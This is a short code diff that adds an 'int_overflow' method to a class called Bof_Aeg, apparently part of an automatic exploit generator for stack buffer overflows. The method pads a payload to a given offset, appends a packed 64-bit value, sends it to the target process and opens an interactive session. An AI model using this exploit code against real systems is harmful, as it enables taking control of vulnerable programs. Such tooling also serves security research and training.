@@ -88,6 +88,15 @@ class Bof_Aeg(object):
 
         self.entry_state = state.copy()
 
+    def int_overflow(self, value, offset, prefix=b''):
+        if isinstance(prefix, bytes):
+            payload = prefix
+        elif isinstance(prefix, str):
+            payload = prefix.encode()
+        payload += b'\0'*(offset-8-len(prefix)) + pwn.p64(value)
+        self.p.sendline(payload)
+        self.p.interactive()
+
     def find_stack_bof(self):
         """Exploring stack overflow vulnerabilities
         """
